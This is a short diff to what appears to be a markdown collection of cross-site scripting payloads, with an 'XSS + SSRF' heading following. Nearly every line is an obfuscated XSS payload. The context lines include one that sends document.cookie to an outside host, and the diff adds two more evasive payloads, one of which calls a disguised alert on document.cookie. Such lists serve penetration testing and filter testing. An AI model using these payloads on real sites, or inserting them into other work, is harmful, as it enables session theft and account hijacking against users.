@@ -111,6 +111,8 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <<script>alert('xss')<!--a-->a.png
 java%0dscrip%0d%1b%1bt:console.log`${document.cookie}`}
 java%0dscrip%0d%1b%1bt:console.log`${location=`https://www.pudim. com?c=${document.cookie}`}
+"><x onauxclick=a=alert,a(domain)>click
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
 ```
 
 ## XSS + SSRF <br>
